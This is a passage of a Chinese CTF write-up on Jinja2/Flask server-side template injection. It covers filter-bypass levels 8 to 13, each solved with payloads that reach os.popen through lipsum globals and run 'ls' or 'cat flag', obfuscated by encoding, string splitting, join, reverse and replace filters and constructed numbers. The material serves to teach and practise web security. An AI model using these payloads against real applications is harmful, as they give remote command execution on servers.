+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">&#x27;__globals__&#x27;</span>)|attr(<span class="hljs-name">&#x27;__getitem__&#x27;</span>)(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;ls&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">&quot;\u005f\u005fglobals\u005f\u005f&quot;</span>)|attr(<span class="hljs-name">&quot;\u005f\u005fgetitem\u005f\u005f&quot;</span>)(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;cat flag&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">&quot;%c%cglobals%c%c&quot;</span>%(<span class="hljs-name">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>))|attr(<span class="hljs-name">&quot;%c%cgetitem%c%c&quot;</span>%(<span class="hljs-name">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>))(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;cat flag&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h1><p>过滤关键字<code>“class”, “arg”, “form”, “value”, “data”, “request”, “init”, “global”, “open”, “mro”, “base”, “attr”</code></p>
+<p>这里有5种方法：</p>
+<ol>
+<li>字符编码</li>
+<li>字符拼接</li>
+<li>使用Jinja2中的<code>~</code>拼接</li>
+<li>使用过滤器（reverse反转、replace替换、join拼接）</li>
+<li>利用python的char()</li>
+</ol>
+<p><strong>第一种</strong>前面用过，这里就不再提了</p>
+<p><strong>第二种，</strong></p>
+<p><code>&#123;&#123;lipsum['__globals__']['os']['popen']('ls')['read']()&#125;&#125;</code></p>
+<p>改为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum[<span class="hljs-string">&#x27;__glo&#x27;</span><span class="hljs-string">&#x27;bals__&#x27;</span>][<span class="hljs-string">&#x27;os&#x27;</span>][<span class="hljs-string">&#x27;pop&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>](<span class="hljs-string">&#x27;ls&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;<br><br>&#123;&#123;lipsum[<span class="hljs-string">&#x27;__glo&#x27;</span>+<span class="hljs-string">&#x27;bals__&#x27;</span>][<span class="hljs-string">&#x27;os&#x27;</span>][<span class="hljs-string">&#x27;pop&#x27;</span>+<span class="hljs-string">&#x27;en&#x27;</span>](<span class="hljs-string">&#x27;cat flag&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>第三种，</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;__glo&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">b</span>=<span class="hljs-string">&#x27;bals__&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">c</span>=<span class="hljs-string">&#x27;po&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">d</span>=<span class="hljs-string">&#x27;pen&#x27;</span>%&#125;&#123;&#123;lipsum[a~b][<span class="hljs-string">&#x27;os&#x27;</span>][c~d](<span class="hljs-string">&#x27;ls&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>第四种，</strong></p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=<span class="hljs-string">&quot;__slabolg__&quot;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> b=<span class="hljs-string">&quot;nepop&quot;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;lipsum[a][<span class="hljs-string">&#x27;os&#x27;</span>][b](<span class="hljs-string">&#x27;ls&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=<span class="hljs-string">&quot;__gmmbals__&quot;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">replace</span>(<span class="hljs-string">&quot;mm&quot;</span>,<span class="hljs-string">&quot;lo&quot;</span>)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> b=<span class="hljs-string">&quot;pommn&quot;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">replace</span>(<span class="hljs-string">&quot;mm&quot;</span>,<span class="hljs-string">&quot;pe&quot;</span>)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;lipsum[a][<span class="hljs-string">&#x27;os&#x27;</span>][b](<span class="hljs-string">&#x27;ls&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>第五种，</strong></p>
+<p>从内置函数里面获取 ASCII 解码功能，并赋值给变量 chr，从而使得chr变为可以ASCII 解码的函数</p>
+<p>原理大概是这样，但下面payload有问题，并不好使</p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> chr=url_for.__globals__[<span class="hljs-string">&#x27;__builtins_&#x27;</span>].chr <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[chr(<span class="hljs-number">95</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">95</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">108</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">95</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">95</span>)]&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h1><p>过滤数字</p>
+<p>但我们的payload并没有数字<code>&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;</code></p>
+<p>为了学习，我们这里还是讲如何构造数字，比如我们构造10：</p>
+<p><code>&#123;%set a='aaaaaaaaaa'|length%&#125;&#123;&#123;a&#125;&#125;</code></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358687.png" srcset="/img/loading.gif" lazyload alt="image-20250216155226644"></p>
+<p>然后我们构造199，利用第一关的payload</p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=<span class="hljs-string">&#x27;aaaaaaaaaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span>*<span class="hljs-string">&#x27;aaaaaaaaaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span>*<span class="hljs-string">&#x27;aa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span>-<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;().__class__.__base__.__subclasses__()[a].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&quot;cat flag&quot;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358744.png" srcset="/img/loading.gif" lazyload alt="image-20250216155604275"></p>
+<h1 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h1><p>直接获取config失败</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358189.png" srcset="/img/loading.gif" lazyload alt="image-20250216160126527"></p>
+<p>还有别的获取config的方法</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里我们可以返回再看一下常见的内置函数和内置对象</p>
+<h1 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h1><p>过滤了部分符号，有<code>‘’&#39;, ‘&quot;’, ‘+’, ‘request’, ‘.’, ‘[’, ‘]’</code></p>
+<p>这里我们需要用join过滤器</p>
+<p>比如构造<code>__globals__</code></p>
+<p><code>&#123;%set a=dict(__glob=1,als__=2)|join%&#125;&#123;&#123;a&#125;&#125;</code></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358680.png" srcset="/img/loading.gif" lazyload alt="image-20250216173019968"></p>
+<p>所以我们需要逐步将<code>&#123;&#123;lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('ls')|attr('read')()&#125;&#125;</code>构造出来，</p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=dict(__glob=<span class="hljs-number">1</span>,als__=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> b=dict(__get=<span class="hljs-number">1</span>,item__=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> c=dict(o=<span class="hljs-number">1</span>,s=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> d=dict(po=<span class="hljs-number">1</span>,pen=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> cmd=dict(l=<span class="hljs-number">1</span>,s=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> e=dict(re=<span class="hljs-number">1</span>,ad=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;lipsum<span class="hljs-punctuation">|</span>attr(a)<span class="hljs-punctuation">|</span>attr(b)(c)<span class="hljs-punctuation">|</span>attr(d)(cmd)<span class="hljs-punctuation">|</span>attr(e)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132359450.png" srcset="/img/loading.gif" lazyload alt="image-20250216174027068"></p>
+<p>但是<code>cat flag</code>中间有空格，通过上面的方法只能构造<code>catflag</code></p>
+<p>下面我们讲一下获取符号。</p>
+<p>获取符号的几种语句：</p>
+<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> kg=(&#123;&#125;|select()|string())%&#125;</span><span class="hljs-template-variable">&#123;&#123;kg&#125;&#125;</span><span class="language-xml"> # 获取空格、下划线，结果：<span class="hljs-tag">&lt;<span class="hljs-name">generator</span> <span class="hljs-attr">object</span> <span class="hljs-attr">select_or_reject</span> <span class="hljs-attr">at</span> <span class="hljs-attr">0x7f838c27f4c0</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> kg=(self|string())%&#125;</span><span class="hljs-template-variable">&#123;&#123;kg&#125;&#125;</span><span class="language-xml"> # 获取空格，结果：<span class="hljs-tag">&lt;<span class="hljs-name">TemplateReference</span> <span class="hljs-attr">None</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> kg=(self|string|<span class="hljs-name">urlencode</span>)%&#125;</span><span class="hljs-template-variable">&#123;&#123;kg&#125;&#125;</span><span class="language-xml"> # 获取百分号，结果：%3CTemplateReference%20None%3E</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> kg=(app.__doc__|string)%&#125;</span><span class="hljs-template-variable">&#123;&#123;kg&#125;&#125;</span><span class="language-xml"> # 获取空格、单引号、反引号，结果太长</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure>
+
+<p>我们以<code>&#123;%set kg=(&#123;&#125;|select()|string())%&#125;&#123;&#123;kg&#125;&#125;</code>为例，详细讲解如何获取符号，</p>
+<p>先看看都有啥符号</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132359938.png" srcset="/img/loading.gif" lazyload alt="image-20250216204044629"></p>
+<p>换成list格式，<code>&#123;%set kg=(&#123;&#125;|select()|string())|list%&#125;&#123;&#123;kg&#125;&#125;</code></p>
+<p>然后数自己想要的符号是第几个（从0开始数）</p>
+<p>![image-20250216203942888](E:\Program Files\Typora\typora_user_images\image-20250216203942888.png)</p>
+<p>可以数到我们想要的空格在第10位，用<code>&#123;%set kg=(&#123;&#125;|select()|string())[10]%&#125;&#123;&#123;kg&#125;&#125;</code>来取</p>
+<p>但是这里过滤方括号，根据第四关，我们改为<code>&#123;%set kg=(&#123;&#125;|select()|string())|attr('__getitem__')(10)%&#125;&#123;&#123;kg&#125;&#125;</code></p>
+<p>然后可以用join构造的<code>__getitem__</code>代替上句中的，构造如下</p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=dict(__glob=<span class="hljs-number">1</span>,als__=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> b=dict(__get=<span class="hljs-number">1</span>,item__=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> c=dict(o=<span class="hljs-number">1</span>,s=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> d=dict(po=<span class="hljs-number">1</span>,pen=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> kg=(&#123;&#125;<span class="hljs-punctuation">|</span>select()<span class="hljs-punctuation">|</span>string())<span class="hljs-punctuation">|</span>attr(b)(<span class="hljs-number">10</span>)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> cmd=(dict(cat=<span class="hljs-number">1</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,kg,dict(flag=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> e=dict(re=<span class="hljs-number">1</span>,ad=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;lipsum<span class="hljs-punctuation">|</span>attr(a)<span class="hljs-punctuation">|</span>attr(b)(c)<span class="hljs-punctuation">|</span>attr(d)(cmd)<span class="hljs-punctuation">|</span>attr(e)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> f=dict(po=x,p=y)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> kg=(lipsum<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list)<span class="hljs-punctuation">|</span>attr(f)(<span class="hljs-number">9</span>)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=dict(__glob=<span class="hljs-number">1</span>,als__=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> b=dict(__get=<span class="hljs-number">1</span>,item__=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> c=dict(o=<span class="hljs-number">1</span>,s=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> d=dict(po=<span class="hljs-number">1</span>,pen=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> cmd=(dict(cat=<span class="hljs-number">1</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,kg,dict(flag=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> e=dict(re=<span class="hljs-number">1</span>,ad=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;lipsum<span class="hljs-punctuation">|</span>attr(a)<span class="hljs-punctuation">|</span>attr(b)(c)<span class="hljs-punctuation">|</span>attr(d)(cmd)<span class="hljs-punctuation">|</span>attr(e)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132359832.png" srcset="/img/loading.gif" lazyload alt="image-20250216182054538"></p>
+<h1 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h1><p>过滤了数字和部分符号，有<code>‘_’, ‘.’, ‘0-9’, ‘\’, ‘’&#39;, ‘&quot;’, ‘[’, ‘]’</code></p>
+<p>构造空格<code>&#123;%set kg=(lipsum|string|list)|attr('pop')(9)%&#125;&#123;&#123;kg&#125;&#125;</code></p>
+<p>构造下划线<code>&#123;%set xhx=(lipsum|string|list)|attr('pop')(18)%&#125;&#123;&#123;xhx&#125;&#125;</code></p>
+<p>但这里有过滤了数字，所以我们还要构造数字，如下</p>
+<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> nine=dict(aaaaaaaaa=x)|<span class="hljs-name">join</span>|count %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> eighteen=nine+nine %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> f=dict(po=x,p=y)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> xhx=(lipsum|string|list)|attr(f)(eighteen)%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> kg=(lipsum|string|list)|attr(f)(nine)%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> a=(xhx,xhx,dict(glob=x)|<span class="hljs-name">join</span>,dict(als=y)|<span class="hljs-name">join</span>,xhx,xhx)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> b=(xhx,xhx,dict(get=x)|<span class="hljs-name">join</span>,dict(item=y)|<span class="hljs-name">join</span>,xhx,xhx)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> c=dict(o=x,s=y)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> d=dict(po=x,pen=y)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> e=dict(re=x,ad=y)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">set</span> cmd=(dict(cat=x)|<span class="hljs-name">join</span>,kg,dict(flag=y)|<span class="hljs-name">join</span>)|<span class="hljs-name">join</span>%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;lipsum|attr(a)|attr(b)(c)|attr(d)(cmd)|attr(e)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure>
+
+<p>更易读一些的payload：</p>
+<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> nine=dict(aaaaaaaaa=a)|<span class="hljs-name">join</span>|count %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> eighteen=nine+nine %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> pop=dict(pop=a)|<span class="hljs-name">join</span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> xhx=(lipsum|string|list)|attr(pop)(eighteen) %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> kg=(lipsum|string|list)|attr(pop)(nine) %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> globals=(xhx,xhx,dict(globals=a)|<span class="hljs-name">join</span>,xhx,xhx)|<span class="hljs-name">join</span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> getitem=(xhx,xhx,dict(getitem=a)|<span class="hljs-name">join</span>,xhx,xhx)|<span class="hljs-name">join</span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> os=dict(os=a)|<span class="hljs-name">join</span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> popen=dict(popen=a)|<span class="hljs-name">join</span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> flag=(dict(cat=a)|<span class="hljs-name">join</span>,kg,dict(flag=a)|<span class="hljs-name">join</span>)|<span class="hljs-name">join</span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> read=dict(read=a)|<span class="hljs-name">join</span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(flag)|attr(read)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h1><p>过滤了部分符号和关键字，有<code>‘_’, ‘.’, ‘\’, ‘’&#39;, ‘&quot;’, ‘request’, ‘+’, ‘class’, ‘init’, ‘arg’, ‘config’, ‘app’, ‘self’, ‘[’, ‘]’</code></p>
+<p>改掉level11的下划线或者改掉level12的加号</p>
